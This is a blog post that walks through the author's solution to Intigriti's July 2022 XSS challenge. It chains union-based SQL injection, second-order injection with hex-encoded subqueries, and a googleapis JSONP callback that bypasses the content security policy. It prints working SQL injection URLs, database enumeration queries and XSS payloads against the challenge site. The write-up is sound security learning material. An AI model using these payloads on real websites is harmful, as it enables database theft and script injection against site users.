---
layout: post
title:  "Intigriti july xss challenge"
date:   2022-07-28 09:29:20 +0700
categories: ctfwriteup
---

### Intigriti July xss challenge

- Hey all it been an really long time since i last posted something !

- Thankfully intigriti came up with an xss challenge for the month july and i solved it :D

<img src="xsschallenge.png"></img>

- Lets get into the challenge page and the challenge page seemed very blank ( no javascripts , no insertion points) at first thought!

<img src="challengepage.png"></img>

- The only dynamic activity happened in the page was fetching blog archives via month parameter.

<img src="dynamic.png"></img>

- Inserting any values or special characters throwed an error page and inserting any incremental numbers 4,5 throwed an blank page.

<img src="error.png"></img> 

- hmmmm! maybe an sqlinjection? tried some logical payloads,Guess what? yesss sql injectionnnnn.

<img src="fails.png">

<img src="loads.png">

- But what we do with sql injection in an xss challenge? ok lets check wether we can dump the database.

- Going towards the classic sql exploitation!

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 order by 1,2,3,4,5 -- -

Confirmed there is 5 columns using order by clause

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select 1,2,3,4,5 -- -

Noticed the reflection on 2,3,5 by union select clause
```

- Can execute mysql functions,Checked with database(),user(),version() at first! and we are sitting on the 'blog' database.

<img src="reflect.png">

- Dumping the table names of the database blog;

<img src="tablename.png">

```
Query used : https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20union%20select%20null,group_concat(table_name),null,null,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--%20-#
```

- We came to an understanding there are three tables "post,user,youtube"! Now onto dumping the columns and contents.

<img src="whole.png">

- The above is the structure "database > tables > column"

```
Queries Used:
'https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -

https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x706f7374-- -

https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x796f7574756265-- -
```

- Note : I hex encoded the values of table name since the query escapes any special characters and throws error.

- After spending some time on examining data from each column, nothing been found except i was rickrolled on youtubeid :| 

<img src="rickroll.png">

- It went on limelight that this challenge has nothing to do with data dump.

- Then tried to inject my content on the reflected 2,3 and 5th columns.

```
query used : 
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select 1,0x3c696d67207372633d313e,0x3c696d67207372633d313e,4,0x3c696d67207372633d313e -- -
```

<img here>

- It went really bad that all the special characters were filtered,thought might be the work of htmlspecialchars function on php :|

- It was the time i was stuck and tried things like load_file function :trollface: 

- Then i tried to bypass the encoding with unicodes,double encoding and searched if there is any possible bypasses for htmlsepcialchars!

- Nothing helped sadly :(

- Then i came across this lovely rendition,the author name which was never rendered in any of the reflection(output by our sqlinjection query) magically came up when i tried some fuzzing with integers( ah i completely forgot to notice this ;} the author name)

<img src="kanom.png">

<img src="iruku.png">

- Then i founded that the 4th column is responsible for this behaviour.

```
Query : https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1,null -- -

Output : Anton

Query : https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,2,null -- -

Ouput : Jake
```

- Something was really fishy as the output was generated by the IDs 1,2 respecitively belongs to the Anton and jake

- Maybe the sql execution is passed down to a separate sql query?

- i tried with logical statement and yessssss it is :0

```
Query Used :  

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1 AND 1=1,null -- -

Output reflected 

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,1 AND 1=0,null -- -

Output not reflected

```

- The i went the classical approach to find the columns and reflective field.

- I was able to find there were three columns (assumed it is user table).

```
Query used:
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x31206f7264657220627920312c322c33,null -- -

1 order by 1,2,3  :  0x31206f7264657220627920312c322c33

Output renders

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x31206f7264657220627920312c322c332c34,null -- -

1 order by 1,2,3,4  :  0x31206f7264657220627920312c322c332c34

No output
```

Note : hex encoded since comma(,) will affect the query.

- Then i tried to see which column is injectable with union query but here comes the plot twist "No ouput" ; only jake and anton were reflected respectively.

```
Query used : 
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x3220756e696f6e2073656c65637420312c322c64617461626173652829202d2d202d,null -- -

2 union select 1,2,database() -- -  :  0x3220756e696f6e2073656c65637420312c322c64617461626173652829202d2d202d
```

- I was at dead end ,nothing seemed to work for a long time.
- I tried googling random things about sql injection and blogs( Some good learnings tho).
- Then i found this blog https://vk9-sec.com/advanced-sql-injection-union-based/

```
From the blog: 
But in case you cannot see any of these column printed then you can simply invalidate the first query so that it wonâ€™t give any output and eventually your output will become the one and only output to be printed.
```

- It made sense , The only ouput i was able to get was author name,maybe invalidating that query will actually make the union select query works?lets try!!!

<img src="2ref.png">

- yasssssssss ! we got reflection on the 2 column on user table!

```
Query used:
(https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select null,null,null,0x3120616e64203020756e696f6e2073656c65637420312c322c33202d2d202d,null from post-- -#)

1 and 0 union select 1,2,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c322c33202d2d202d

```

- Then tried to check whether it has any special character escape and it did'nt had :0 

<img src="xss.png">

- We almost done the challenge, now the only part that is required is bypassing the csp !

```
Query Used:

1 and 0 union select 1,0x3c696d67207372633d31206f6e6572726f723d616c6572742831293e,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c307833633639366436373230373337323633336433313230366636653635373237323666373233643631366336353732373432383331323933652c33202d2d202d
<img src=1 onerror=alert(1)>  :  0x3c696d67207372633d31206f6e6572726f723d616c6572742831293e
```

- CSP :

<img src="csp.png">

- My first go to is https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass ; since i already read about googleapis CSP bypass.

- But unfortunately the callback sites on the googleapis was down.

- Then i found the working endpoint on https://brutelogic.com.br/blog/csp-bypass-guidelines/

```
<Script Src=https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)></Script>
```

- Now time to frame the query !

```
<script src='https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)'></script>  :  0x3c736372697074207372633d2768747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c65727428646f63756d656e742e646f6d61696e29273e3c2f7363726970743e

1 and 0 union select 1,0x3c736372697074207372633d2768747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c65727428646f63756d656e742e646f6d61696e29273e3c2f7363726970743e,3 -- -  :  0x3120616e64203020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323736383734373437303733336132663266373737373737326536373666366636373663363536313730363937333265363336663664326636333735373337343666366437333635363137323633363832663736333133663633363136633663363236313633366233643631366336353732373432383634366636333735366436353665373432653634366636643631363936653239323733653363326637333633373236393730373433652c33202d2d202d

https://challenge-0722.intigriti.io/challenge/challenge.php?month=3%20union%20select%20null,null,null,0x3120616e64203020756e696f6e2073656c65637420312c3078336337333633373236393730373432303733373236333364323736383734373437303733336132663266373737373737326536373666366636373663363536313730363937333265363336663664326636333735373337343666366437333635363137323633363832663736333133663633363136633663363236313633366233643631366336353732373432383634366636333735366436353665373432653634366636643631363936653239323733653363326637333633373236393730373433652c33202d2d202d,null%20from%20post--%20-#
```

- Now pasting the url on the browser window !

<img src="popup.png">

- Thats really a cute popup ! shoutout to intigriti and vroemy for the awesome challenge!
